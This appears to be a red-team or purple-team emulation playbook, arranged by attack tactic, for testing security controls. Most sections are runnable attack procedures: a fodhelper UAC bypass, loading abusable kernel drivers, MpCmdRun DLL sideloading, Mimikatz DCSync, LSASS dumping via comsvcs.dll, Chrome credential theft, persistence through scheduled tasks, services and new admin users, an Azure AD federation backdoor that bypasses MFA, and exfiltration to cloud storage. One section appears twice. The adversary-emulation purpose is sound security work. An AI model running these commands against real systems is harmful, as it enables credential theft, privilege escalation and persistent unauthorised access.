# General

# Initial Access

## MFA Push Spam - General guidance

Push-based MFA systems are susceptible to abuse by attackers because they allow an attacker to send a large volume of MFA requests to a user in order to induce that user to accept the prompt in the hopes it ends the requests.

Spam a target user with MFA approval prompts. Unlike a real-world scenario, this is not meant to test the human response to being inundated with MFA requests but rather the technical security controls for such a situation.

### Guidance

Send at least 10 MFA requests to the target user

### Notes

- If MFA is in place, but it does not use some form of zero-knowledge approval (e.g. push notification accept, SMS accept, etc), then it should be considered a block. For example, if the MFA systems requires entering a one-time code, then it would not be susceptible to this attack and therefore be blocked. If no MFA is enforced, it should be considered not blocked.

## Malicious ISOs - Generic ISO-wrapped payload

ISO archives can be used to deliver malicious payloads while bypassing mark-of-the-web restrictions

Use an ISO to deliver a malicious executable payload

### Prerequisites

1. Payload
1. ISO containing the payload 
   1. You can use `mkisofs` to create an ISO:
   ```
   bash> mkisofs -J -o {{ iso }} {{ payload }}
   ```

## Suspicious connections - General guidance

### Guidance

When using a browser, you can override the user agent string by using an extension. For example:

- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg

You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.

## Suspicious connections - General guidance

### Guidance

When using a browser, you can override the user agent string by using an extension. For example:

- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg

You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.

## Suspicious connections - Service use

### Prerequisites

- A valid session token(s) for the user
  - Retrieve via browser cookie dumping, exporting from the browser web developer console, a browser extension, or another suitable method

# Execution

# Defense Evasion

## Malicious kernel driver use - load known-abusable driver

Kernel drivers can be used by attackers for a number of malicious activities, including hiding artifacts and tampering with endpoint security tools.

This bypasses the need for attackers to retrieve legitimate code-signing certificates for a driver they wrote.

### Prerequisites

- Local admin
- A known-abusable driver. Examples: 
  - **DBUtil_2_3 (SHA256 - 0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5)**
  - RTCore64 (SHA256 - 01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd)
  - IQVM64 (SHA256 - 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b)

### Guidance

Example loading using sc.exe

```
cmd> sc.exe create {{ name }} type= kernel start= demand error= normal binpath= c:\windows\System32\Drivers\{{ sys_file }} displayname= {{ name }}
```

### Cleanup

- Is using sc.exe, stop and delete the service then restart the machine

### Notes

Drivers can be found in multiple places, including:

- Directly from vendor sites
- VirusTotal
- Aggregators like LOLDrivers and KDU
  - LOLDrivers: https://github.com/magicsword-io/LOLDrivers/tree/main/drivers
  - KDU: https://github.com/hfiref0x/KDU/

## DLL Side Loading - General guidance

### Notes

- For an up-to-date list of side-loadable DLLs, refer to https://hijacklibs.net/

## DLL Search Order Hijacking - MpCmdRun.exe sideloading

MpCmdRun.exe is susceptible to a DLL sideloading hijack via its dependency on MpClient.dll

### Prerequisites

- A DLL with the appropriate exports called `mpclient.dll`
  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload/mpclient

### Guidance

Copy `c:\program files\windows defender\mpcmdrun.exe` to the same directory as the `mpclient.dll` payload then run `mpcmdrun.exe`

## UAC Bypass - via fodhelper.exe

User Account Control is not a security control but can cause issues with execution when attempting privileged operations

Move to a high-integrity execution context via fodhelper.exe and a Registry modification. Fodhelper.exe is one of many unpatched methods for bypassing UAC.

### Prerequisites

- Split-token admin account

### Guidance

Check for the existence of the target registry key. If it exists, note the value so that it can be restored after execution.

```
cmd> reg query HKCU\Software\Classes\ms-settings\Shell\Open\command
```

Modify the registry key and execute fodhelper.exe to obtain an elevated command prompt:

```
cmd> 
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\windows\system32\cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d "" /f
c:\windows\system32\fodhelper.exe
```

### Cleanup

If the registry existed prior to execution, restore its value:

```
cmd> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v {{ initial_command }} /f
```

Otherwise, delete the key:

```
cmd> reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
```

### References

- https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
- https://4pfsec.com/offensive-windows-fodhelper-exe/

## Conditional Access Policy Modifications - General guidance

### Notes

- Create a new conditional access policy to avoid modifying production policies. Additionally, consider disabling the policy or setting it to report-only before modifying it. 

# Discovery

# Command and Control

## Remote Assistance Software - General guidance

Access via remote assistance software

Select and use a well-known remote assistance software

### Prerequisites

1. An account for the service
2. Tool client downloaded and installed
   1. TeamViewer: https://www.teamviewer.com/
   2. GoTo Resolve: https://www.goto.com/it-management/resolve
   3. ConnectWise Control: https://control.connectwise.com/

### Notes

- Where possible, use remote assistance software already in use in the environment

## Remote tool download - General guidance

Transfer tool into environment by downloading from the Internet

### Notes

- The maliciousness level of the binary should align with the intent of the test. For testing signature-based checks, use a known malicious tool, such as Mimikatz. For testing sandboxing or similar network security technologies, use an unknown yet still overtly malicious tool, such as one built around the current attack infrastructure. By default, start with the most malicious choice.

# Collection

# Credential Access

## DCSync - via Mimikatz

The DCSync attack mimics normal replication behavior between DCs, allowing for remote extraction of credentials

Uses Mimikatz's lsadump::dcsync command

### Prerequisites

- Command execution in the context of an account with Active Directory replication rights
- User accounts to target
- Mimikatz binary (https://github.com/gentilkiwi/mimikatz)

### Guidance

```
mimikatz> lsadump::dcsync /domain:{{ domain }} /user:{{ target_username }}
```

### Troubleshooting

If Mimikatz is giving an error of `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)`, try the following:

```
cmd> klist purge
cmd> gpupdate /force
```

## LSASS dumping using comsvcs.dll - via rundll32.exe

Use `rundll32.exe` to call the `MiniDump` export from `comsvcs.dll`

### Prerequisites

- Administrator rights
- SeDebugPrivilege

### Guidance

```
shell> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ lsass_pid }} {{ outpath }} full
```

This command must be run from a shell process that has `SeDebugPrivilege` enabled. 
PowerShell should work to this end. 

You can acquire `SeDebugPrivilege` for `cmd.exe` by launching it as `SYSTEM` via Sysinternals' `PsExec` (`psexec -sid cmd`). 
Alternatively, you can use the VBScript file from `modexp`: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ (`cscript procdump.vbs lsass.exe`)

### Cleanup

- Delete the dump file

## Browser credential dumping - Chromium-based via SharpChrome

https://github.com/GhostPack/SharpDPAPI

### Prerequisites

- kill all processes for the target browser
- compiled binary 
	- using Visual Studios: -> load solution file -> set to "Release" -> build

# Impact

## GPO Modifications - General guidance

### Guidance

To modify a new domain GPO via the Group Policy Editor:

1. Log onto domain controller as domain admin
2. Open the Server Manager -> Tools -> Group Policy Management
3. On the left menu -> Expand the forest/domains sections then locate the target domain
4. Expand the target domain and locate the "Group Policy Objects" folder
5. Right-click the folder -> New -> Enter a name
6. Locate the newly created GPO -> right-click -> GPO Status -> Un-check enabled
7. Edit the GPO's setting(s) as desired

### Cleanup

Delete the GPO if using a new GPO, otherwise revert any settings changes

### Notes

Create a new group policy object to avoid modifying production policies. Additionally, consider disabling the policy before modifying it. 

# Exfiltration

## DLP Test - General use

DLP Test (dlptest.com) is a web utility for testing if exfiltration of sensitive data is successful

General usage notes for DLP Test

### Notes

- If sample sensitive data is needed, the site provides it in different types and formats
- The site supports HTTP, HTTPS, and FTP
- Do not upload actual sensitive data to the site

## Exfiltration to cloud storage - General guidance

Select and use a well-known cloud storage service

### Prerequisites

1. An account for the service
2. Tool client downloaded and installed
   1. Generic: https://rclone.org/downloads/
   2. MEGA: https://mega.io/desktop
   3. Dropbox: https://www.dropbox.com/install

### Notes

- Where possible, use cloud storage service already in use in the environment

# Lateral Movement

# Persistence

## Scheduled Task Persistence - via schtasks.exe

Use built-in schtasks.exe to persist by creating a scheduled task

### Guidance

```
CMD> schtasks /Create /SC DAILY /TN "{{ taskname }}" /TR "{{ command }}" /ST 09:00
```

### Cleanup

```
CMD> schtasks /delete /tn "{{ taskname }}" /f
```

## Windows Service Persistence - via sc.exe

Use built-in sc.exe to persist

### Guidance

```
CMD> sc create {{ service_name }} binPath= "{{ command }}"
```

### Cleanup

```
CMD> sc delete {{ service_name }}
```

## New user persistence - via net.exe

Use built-in net.exe to persist by creating a new local administrator user

### Guidance

```
CMD> net user /add {{ username }} {{ password }}
CMD> net localgroup {{ group_name }} {{ username }} /add
```

### Cleanup

```
CMD> net user /delete {{ username }}
```

## Persistence in Azure AD - Register a New Device

Register a new device in Azure AD

### Prerequisites

- Azure AD credentials
- AAD Internals PowerShell module (https://aadinternals.com/aadinternals/#installation)
  - Install: `PS> install-module aadinternals -scope currentuser`
  - Import: `PS> import-module aadinternals`

### Guidance

Authenticate to Azure AD and save the token

```
PS> Get-AADIntAccessTokenForAADJoin -SaveToCache
```

Register a device: 

```
PS> Join-AADIntDeviceToAzureAD -DeviceName "{{ device_name }}" -DeviceType "{{ device_type }}" -OSVersion "{{ os_version }}" -JoinType Register
```

  - This will save a `.pfx` certificate to the current working directory, which is needed for cleanup
  - Note: The provided values do not need to refer to real characteristics

### Cleanup

Remove the device from Azure AD 

```
PS> Remove-AADIntDeviceFromAzureAD -PfxFileName {{ pfx_certificate_file }}
```

## Azure AD Domain Federation - Backdoor via AADInternals

Use AADInternals to create a backdoor federation domain for persisting access to an environment.

### Prerequisites

- AADInternals installed
  - `Install-Module AADInternals`
- Permissions to modify domain authentication settings
  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
- A target verified domain in Azure AD
  - To add a domain, Go to Azure AD -> custom domain names -> add -> set the provided DNS records for your domain -> wait for the verification to compelete
- A user with an immutable ID set
  - To set an immutable ID for a user: `Set-AADIntUser -UserPrincipalName {{ upn_or_email }} -ImmutableId "{{ id }}" -AccessToken $at` where the `id` is an arbitrary unnique value

### Guidance

To set the backdoor 

```
PS> ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "{{ domain }}"
```

To use the backdoor. This works for any user in the tenant, regardless of their domain.

```
Open-AADIntOffice365Portal -ImmutableID {{ id }} -UseBuiltInCertificate -ByPassMFA $true -Issuer {{ issuer }}
```

- `id` is the immutable ID of the target user
- `issuer` is the IssuerUri provided in the output of the previous command 

### Cleanup

- Delete the domain

### Notes

- The domain must be verified for the backdoor to work

### References

- https://o365blog.com/post/aadbackdoor/
- https://www.mandiant.com/resources/blog/detecting-microsoft-365-azure-active-directory-backdoors

